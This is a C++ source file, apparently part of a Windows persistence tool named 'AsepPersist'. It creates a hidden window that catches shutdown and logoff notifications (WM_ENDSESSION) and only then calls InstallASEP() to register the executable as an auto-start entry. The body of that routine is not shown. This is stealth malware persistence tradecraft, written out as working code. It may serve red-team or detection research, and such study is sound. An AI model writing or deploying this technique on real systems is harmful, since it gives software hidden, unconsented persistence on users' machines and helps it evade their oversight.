#include "AsepPersist.h"
#include <winternl.h>

#pragma comment( lib, "ntdll" )
DWORD GetParentProcessId(VOID)
{
	PROCESS_BASIC_INFORMATION BasicInfo;
	DWORD ReturnLength{};
	
	if (NTSTATUS St = NtQueryInformationProcess(
		GetCurrentProcess(),
		ProcessBasicInformation,
		&BasicInfo, \
		sizeof(BasicInfo),
		&ReturnLength);!NT_SUCCESS(St))
	{
		std::cout << std::format("NtQueryInformationProcess(BasicInfo) ERROR=0x{:08x}", St);
		return 0;
	}

	return PtrToUlong(BasicInfo.Reserved3);
}

// Windows message procedure for the hidden windows
// Solicits WM_ENDSESSION messages for logoff and shutdown notifications
// Installs the executable name as the auto-start vector for persistence 

LRESULT CALLBACK WindowProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	switch (message)
	{
	case WM_ENDSESSION:
		// wParam == 0 means the shutdown was CANCELLED
		if (wParam == 0)
			break;
		OutputDebugStringW(L"[+] WM_ENDSESSION ");
		if (lParam == 0)
			OutputDebugStringW(L"SHUTDOWN");
		else if (lParam & ENDSESSION_LOGOFF)
			OutputDebugStringW(L"LOGOFF");
		OutputDebugStringW(L"\n");

		InstallASEP();
		break;

	case WM_CLOSE:
		DestroyWindow(hWnd);
		break;
	case WM_DESTROY:
		PostQuitMessage(0);
		break;
	default:
		return DefWindowProc(hWnd, message, wParam, lParam);
	}
	return 0;
}


// Register a window class, create a hidden window and process messages
bool ProcessMessage(HINSTANCE hInstance)
{
	constexpr LPCWSTR AUTOSTART_CLASS{ L"AutoStart_Class" };
	constexpr LPCWSTR AUTOSTART_TITLE{ L"AutoStart_Title"};
	
	LPCWSTR ClassName = AUTOSTART_CLASS;
	WNDCLASSEXW WndClass{};
	WndClass.cbSize = sizeof(WNDCLASSEXW);
	WndClass.lpfnWndProc = WindowProc;
	WndClass.hInstance = hInstance;
	WndClass.lpszClassName = L"AutoStart_Class";

	ATOM Atom = RegisterClassExW(&WndClass);
	std::wstring log{};
	if(!Atom)
	{
		log = std::format(L"[-] RegisterClassExW() ERROR=0x{:08x}\n", GetLastError());
		OutputDebugStringW(log.c_str());
		return false;
	}
	log = std::format(L"[+] RegisterClassExW() Atom=0x{:08x}\n", Atom);
	OutputDebugStringW(log.c_str());

	LPCWSTR WindowName = AUTOSTART_TITLE;
	HWND Wnd = CreateWindowExW(0, ClassName, WindowName, 0, CW_USEDEFAULT, CW_USEDEFAULT, 0, 0, nullptr, nullptr, hInstance, nullptr);
	if (!Wnd)
	{
		log = std::format(L"[-] CreateWindowExW() ERROR=0x{:08x}\n", GetLastError());
		OutputDebugStringW(log.c_str());
		return false;
	}
	log = std::format(L"[+] CreateWindowExW() Wnd=0x{:08X}\n", (uintptr_t)Wnd);
	OutputDebugStringW(log.c_str());

	// Window must be hidden
	ShowWindow(Wnd, SW_HIDE);
	UpdateWindow(Wnd);

	MSG msg;
	while (GetMessageW(&msg, nullptr, 0,0))
	{
		TranslateMessage(&msg);
		DispatchMessageW(&msg);
	}
	return true;
}